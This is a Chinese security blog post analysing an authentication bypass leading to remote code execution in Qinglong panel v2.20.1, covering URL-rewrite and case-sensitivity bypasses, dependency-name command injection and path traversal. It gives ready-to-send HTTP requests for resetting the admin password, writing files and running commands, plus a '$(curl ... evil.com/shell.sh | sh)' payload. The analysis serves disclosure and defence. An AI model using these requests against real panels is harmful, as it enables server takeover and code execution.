---
title: "青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞"
source: https://mrxn.net/jswz/qinglong-auth-bypass-rce.html
---

# 青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/2/27 12:32
* 2337浏览
* [0评论](#comment)
* 2小时
  阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞分析

## jwt迷雾

默认系统存在硬编码JWT密钥
`whyour-secret`
，导致很多人以为是这个导致的
[RCE](https://mrxn.net/tag/rce)

<https://github.com/whyour/qinglong/blob/d53437d1695d22db266cea3b680d3d7663ce86a6/back/config/index.ts#L44>

```
  jwt: {
    secret: process.env.JWT_SECRET || 'whyour-secret',
    expiresIn: process.env.JWT_EXPIRES_IN,
  },
```

其实并不是，这里只是当系统安装时没有设置
`JWT_SECRET`
环境变量时，默认的jwt密钥，虽然属于硬编码漏洞，但是不是本次漏洞的关键点，因为系统在如下位置https://github.com/whyour/qinglong/blob/d53437d1695d22db266cea3b680d3d7663ce86a6/back/loaders/express.ts#L88 还存在
`isValidToken`
方法对传入的token在系统里进行对比，如果失败就会返回401,jwt malformed。

## 揭开权限绕过真实面纱

要想RCE,后台有很多点都可以
[REC](https://mrxn.net/tag/rce)
、首先需要得到一个系统承认的合法token.有多种方式，如默认口令登录、钓鱼、嗅探等等。

### URL重写绕过

<https://github.com/whyour/qinglong/blob/d53437d1695d22db266cea3b680d3d7663ce86a6/back/loaders/express.ts#L54-L56>

```
  app.use(async (req: Request, res, next) => {
    if (!['/open/', '/api/'].some((x) => req.path.startsWith(x))) {
      return next();
    }
```

只有路径以
`/open/`
或
`/api/`
开头的请求才会继续向下执行，否则直接放行。

然后在
<https://github.com/whyour/qinglong/blob/d53437d1695d22db266cea3b680d3d7663ce86a6/back/loaders/express.ts#L123-L124>

```
  app.use(rewrite('/open/*', '/api/$1'));
  app.use(config.api.prefix, routes());
```

这里Express 中间件注册方法，将中间件挂载到
**全局路由，**
会对所有以
`/open/`
开头的路径进行重写到
`/api/`
路径下。

而在
<https://github.com/whyour/qinglong/blob/d53437d1695d22db266cea3b680d3d7663ce86a6/back/config/index.ts#L173-L186>
定义了如下白名单路径

```
  apiWhiteList: [
    '/api/user/login',
    '/api/health',
    '/open/auth/token',
    '/api/user/two-factor/login',
    '/api/system',
    '/api/user/init',
    '/api/user/notification/init',
    '/open/user/login',
    '/open/user/two-factor/login',
    '/open/system',
    '/open/user/init',
    '/open/user/notification/init',
  ],
```

结合上面的重写，我们可以通过访问
`'/open/user/init'`
后端重写到
`/api/user/init`
绕过权限校验，重写初始化用户密码，然后登录拿到一个合法的token就可以进行后续的利用。

### 大小写绕过

back/loaders/express.ts

```
path: [...config.apiWhiteList, /^\/(?!api\/).*/]
```

这里的正则匹配写的有问题，严格匹配了纯小写的api，只要不是 /api/ 开头，就会绕过 JWT 校验，自定义鉴权中间件使用的是req.path.startsWith判断，它也是严格判断纯小写，并直接放行：

```
if (!['/open/', '/api/'].some((x) => req.path.startsWith(x))) {
  return next();
}
```

所以/API/这类路径会跳过令牌校验，同时又因为Express 默认大小写不敏感，/API/... 还能匹配到 /api/... 这个路由。

```
app.use(config.api.prefix, routes());
```

以及
`req.path.startsWith('/open/')`
亦如此。

总结如下

**源码位置**
:
`back/loaders/express.ts`
L34-41, L53-56, L124

**漏洞根因**
: Express 框架默认路由大小写不敏感（
`caseSensitive: false`
），但所有认证中间件都严格匹配小写。

```
认证链（均严格匹配小写）：
  L34 expressjwt.unless: 正则 /^\/(?!api\/).*/ → 仅匹配小写 "api"
  L54 自定义认证:       req.path.startsWith('/api/') → 严格小写
  L54 自定义认证:       req.path.startsWith('/open/') → 严格小写

路由注册：
  L124 app.use('/api', routes()) → Express 默认 caseSensitive: false
  → /API/、/Api/、/aPi/ 等变体均可匹配路由，但不触发认证检查
```

| 步骤 | 中间件 | `/api/crons` （正常） | `/API/crons` （绕过） |
| --- | --- | --- | --- |
| Layer 1 | expressjwt | JWT 签名验证 | **跳过** （正则不匹配 "API"） |
| Layer 2 | 自定义认证 | isValidToken 校验 | **跳过** （非 "/api/" 或 "/open/" 前缀） |
| 路由匹配 | Express Router | 匹配 /api/crons | **匹配 /api/crons** （大小写不敏感） |
| Handler | CronService | 需认证 → 正常响应 | **无认证 → 直接响应** |

最终绕过了全部鉴权，随意调用后端api，青龙面板的api中有超多可利用的点，随便找一个命令执行的接口就可以利用。

### 依赖相关命令注入

数据流总览

```
POST /API/dependencies [{"name": "$(malicious_cmd)", "type": 0}]
  │
  ▼
① api/dependence.ts L39    Joi.string().required()     ← 仅校验"是字符串"，无过滤
  │
  ▼
② services/dependence.ts L34  new Dependence({...x})   ← 构造函数仅 name.trim()
  │
  ▼
③ services/dependence.ts L39  installDependenceOneByOne(docs)   ← 立即触发安装
  │
  ▼
④ services/dependence.ts L232  depName = dependency.name.trim()
  │
  ▼
⑤ config/util.ts L573   getInstallCommand() → `pnpm add -g ${name.trim()}`
  │                                             ^^^^^^^^^^^^^^^^^^^^^^^^
  │                                             name 被直接拼接进命令字符串！
  ▼
⑥ services/dependence.ts L303  spawn(`${proxyStr} ${command}`, {shell: '/bin/bash'})
                                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                                shell: '/bin/bash' → Bash 解析 $() 子命令 → RCE
```

#### 逐步详解

**① 入口 —
`api/dependence.ts`
L34-53**

```
route.post('/',
  celebrate({
    body: Joi.array().items(
      Joi.object({
        name: Joi.string().required(),   // ← 唯一校验：是非空字符串
        type: Joi.number().required(),   // ← 0=nodejs, 1=python3, 2=linux
      }),
    ),
  }),
  async (req, res, next) => {
    const data = await dependenceService.create(req.body);  // ← 直传
  },
);
```

`Joi.string().required()`
**零安全过滤**
—
`$(curl ... | sh)`
是合法字符串，直接通过。

**② 创建 —
`services/dependence.ts`
L33-41**

```
public async create(payloads: Dependence[]) {
  const tabs = payloads.map((x) => {
    const tab = new Dependence({ ...x, status: DependenceStatus.queued });
    return tab;
  });
  const docs = await this.insert(tabs);       // ← 存入 SQLite
  this.installDependenceOneByOne(docs);        // ← 立即触发安装
}
```

**③ 构造函数 —
`data/dependence.ts`
L13-24**

```
constructor(options: Dependence) {
  this.name = options.name.trim();  // ← 唯一处理：去首尾空格，不过滤任何 Shell 元字符
}
```

**④⑤ 命令拼接 —
`config/util.ts`
L559-573（关键污染点）**

```
export function getInstallCommand(type: DependenceTypes, name: string) {
  const baseCommands = {
    [DependenceTypes.nodejs]:  'pnpm add -g',
    [DependenceTypes.python3]: 'pip3 install ...',
    [DependenceTypes.linux]:   'apk add --no-check-certificate',
  };
  return `${command} ${name.trim()}`;  // ← 用户输入直接拼接，零过滤零转义！
}
```

当
`name = "$(curl -fsSL https://evil.com/shell.sh | sh)"`
时，生成：

```
pnpm add -g $(curl -fsSL https://evil.com/shell.sh | sh)
```

**⑥ 命令执行 —
`services/dependence.ts`
L303-305（最终触发点）**

```
const cp = spawn(`${proxyStr} ${command}`, {
  shell: '/bin/bash',   // ← Bash 解释执行整个字符串
});
```

Bash 执行
`pnpm add -g $(curl ...)`
时的解析流程：

1. 识别
   `$(...)`
   为命令替换（Command Substitution）
2. **先执行**
   `curl -fsSL https://evil.com/shell.sh | sh`
   —
   **恶意代码已以 root 执行**
3. 将输出替换回原位，再执行
   `pnpm add -g <输出>`
   （失败无影响）

#### 同样存在注入的函数（9 个注入点）

`name`
同样被无过滤拼接进以下命令，
**3 种依赖类型 × 3 种操作 = 9 个注入点**
：

```
// getGetCommand (L538-556) — 检查是否已安装
nodejs:  `pnpm ls -g | grep "${name}" | head -1`    // ← 可注入
python3: `python3 -c "... name='${name}' ..."`       // ← 额外 Python 代码注入
linux:   `apk info -es ${name}`                      // ← 可注入

// getInstallCommand (L559-573) — 安装
`${baseCommand} ${name.trim()}`                       // ← 可注入（主攻击面）

// getUninstallCommand (L576-588) — 卸载
`${baseCommand[type]} ${name.trim()}`                 // ← 可注入
```

#### cancel() 取消操作的二次注入（第 10 个注入点）

恶意依赖被创建后，其
`name`
存储在数据库中。当管理员试图
**取消**
该依赖的安装时，
`cancel()`
方法会再次触发命令注入：

```
cancel(ids)
  │
  ▼
services/dependence.ts L158-176:
  doc = DependenceModel.findAll({where: {id: ids}})   ← 从数据库取出恶意 name
  depInstallCommand = getInstallCommand(doc.type, doc.name)
  │                   → "pnpm add -g $(malicious_cmd)"
  ▼
  getPid(depInstallCommand)
  │
  ▼
config/util.ts L414-418:
  taskCommand = `ps -eo pid,command | grep "${cmd}" | grep -v grep | ...`
                                           ^^^^^
                           cmd = "pnpm add -g $(malicious_cmd)"
                           嵌入 Bash 双引号内，$() 仍然被展开！
  │
  ▼
  promiseExec(taskCommand)  →  exec() 通过 /bin/sh 执行  →  Bash 展开 $()  →  RCE
```

**关键技术点**
:
`grep "${cmd}"`
中的双引号
**不阻止**
Bash 的
`$()`
命令替换。Bash 在双引号内仍然执行命令替换、变量展开和算术展开（仅单引号才能完全阻止）。

这意味着攻击者投递恶意依赖后，形成
**"地雷"效应**
：

1. **安装时**
   —
   `spawn()`
   触发 RCE ✅
2. **管理员取消时**
   —
   `getPid()`
   →
   `exec()`
   再次触发 RCE ✅
3. **管理员试图删除/重装时**
   —
   `installDependenceOneByOne(docs, true, true)`
   再次
   `spawn()`
   RCE ✅

## 路径穿越+文件名黑名单绕过

在系统的配置保存部分
<https://github.com/whyour/qinglong/blob/d53437d1695d22db266cea3b680d3d7663ce86a6/back/api/config.ts#L75>

```
const { name, content } = req.body;
if (config.blackFileList.includes(name)) {
  res.send({ code: 403, message: '文件无法访问' });
```

判断保存的文件是不是黑名单里，否则响应403,但是没有return！！！虽然响应403,但是文件实际已经保存写入文件了。其中黑名单如下

```
  blackFileList: [
    'auth.json',
    'config.sh.sample',
    'cookie.sh',
    'crontab.list',
    'dependence-proxy.sh',
    'env.sh',
    'env.js',
    'env.py',
    'token.json',
  ],
  writePathList: [configPath, scriptPath],
```

在文件保存路径处理部分

```
let path = join(config.configPath, name);
if (name.startsWith('data/scripts/')) {
  path = join(config.rootPath, name);
}
await writeFileWithLock(path, content);
res.send({ code: 200, message: '保存成功' });
```

没有对路径进行安全处理，直接拿前端传入的name的值拼接后进行保存，因此可以传入带有路径穿越的name值完成向任意有权限的路径写入任意文件及内容。

## RCE

系统后台RCE的点很多，除了系统任务直接执行和config.sh（系统加载机制决定任意任务执行都会触发）、还有其他的点如task\_before、task\_after （
<https://github.com/whyour/qinglong/blob/d53437d1695d22db266cea3b680d3d7663ce86a6/back/schedule/api.ts#L255-L256>
）

均是执行点，这不是重点，进入了后台，咋都可以
[执行命令](https://mrxn.net/tag/rce)
或者js、py代码。

# 漏洞复现

![青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://image.mrxn.net/1f49fd71298f4fa884049632ac54c607.webp)

## 获取状态

```
GET /api/health HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)
Accept: */*
Host: localhost:5700
```

![青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://image.mrxn.net/d5e130c195aa42b4a2d79dd4fd3d4191.webp)

## 获取版本

```
GET /api/system HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)
Accept: */*
Host: localhost:5700
```

![青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://image.mrxn.net/e8657be80c2e47eea7f07f5c3bc95c57.webp)

## 重置密码

```
PUT /open/user/init HTTP/1.1
Host: 127.0.0.1:5700
Content-Type: application/json

{"username":"Mrxn","password":"[email protected]"}
```

![青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://image.mrxn.net/9f986de50dd84421b7501201580575b9.webp)

## 登录获取token

```
POST /api/user/login HTTP/1.1
Host: 127.0.0.1:5700
Content-Type: application/json

{"username":"Mrxn","password":"[email protected]"}
```

![青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://image.mrxn.net/9705df2bb3f84a35939562c8a3617415.webp)

## 文件读取

```
GET /api/configs/config.sh HTTP/1.1
Authorization: Bearer eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoiQnI5MWh6R1FGckZtdnk3LUtGZWRscnlZbjVENmNXOVVkLVBnTUNXNTNCem5Dcy1JS0NwZzQ2WXJnOWYiLCJpYXQiOjE3NzIxNjA5OTQsImV4cCI6MTc3Mzg4ODk5NH0.K0Bm0bZuBzrSHMMxDwp0gQsQEMBt1hM6Ya0hrhtLuVHHhCWRZn15v4nuxIDbdQ1A
User-Agent: iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)
Accept: */*
Host: localhost:5700
```

![青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://image.mrxn.net/51a187abd74c479e95d9e0ece4d1ae0e.webp)

或者这种方式
`/api/configs/detail?path=config.sh`

## 文件保存+路径穿越

```
POST /api/configs/save HTTP/1.1
Authorization: Bearer eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoiQnI5MWh6R1FGckZtdnk3LUtGZWRscnlZbjVENmNXOVVkLVBnTUNXNTNCem5Dcy1JS0NwZzQ2WXJnOWYiLCJpYXQiOjE3NzIxNjA5OTQsImV4cCI6MTc3Mzg4ODk5NH0.K0Bm0bZuBzrSHMMxDwp0gQsQEMBt1hM6Ya0hrhtLuVHHhCWRZn15v4nuxIDbdQ1A
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: */*
Host: localhost:5700
Content-Type: application/json

{
    "name": "../.././../../../tmp/vuln",
    "content": "vuln_test"
}
```

![青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://image.mrxn.net/62a5c33fd70d4ceb8de23e4387a98e32.webp)

或者修改 config.sh 达到RCE

![青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://image.mrxn.net/e6ba8092452d45548f8bb27fffd9c4bb.webp)

通过在 config.sh 后增加shell代码即可在任务触发时被自动执行。

## RCE

如修改 config.sh 追加
`\ntouch /tmp/hacked`
保存后，任意任务触发均可执行

![青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://image.mrxn.net/1dc11878d31948e29d46db164233f3ef.webp)

不区分大小写的绕过，直接使用后台的命令执行功能执行命令

```
PUT /aPi/system/command-run HTTP/1.1
Host: localhost:5710
Content-Type: application/json

{"command": "id"}
```

![青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://image.mrxn.net/7c8c06c5888242ab8126ebcfe2fa0870.webp)

PS：

这个
[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
也挖到了有一段时间了，我虽然不是第一个挖到的但也不是最后一个吧！不过最近看飞牛、绿联等发布下架青龙面板，同时在GitHub看到有人提了issues 就发出来吧，这个应该不是
[0day](https://mrxn.net/tag/0day)
、看issues有人去年就挖到了。

用AI分析写了个
[报告](https://github.com/Mr-xn/Penetration_Testing_POC/blob/master/qinglong-auth-bypass2rce/%E9%9D%92%E9%BE%99(qinglong)%E9%9D%A2%E6%9D%BF%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E8%87%B4%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C(RCE)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0.md)

* 标签：
* [#
  漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#
  web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#
  代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#
  JavaScript](https://mrxn.net/tag/JavaScript)
* [#
  rce](https://mrxn.net/tag/rce)
* [#
  权限绕过](https://mrxn.net/tag/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)

---




// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录

×



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：
[Mrxn's Blog](https://mrxn.net/)
  
文章标题：
[青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
  
文章链接：
<https://mrxn.net/jswz/qinglong-auth-bypass-rce.html>
  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

设备上扫码阅读



var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/qinglong-auth-bypass-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 plus\_get\_favicon 任意文件上传漏洞](https://mrxn.net/jswz/bigant-plus_get_favicon-upload.html)

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

手机扫码阅读



var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/qinglong-auth-bypass-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});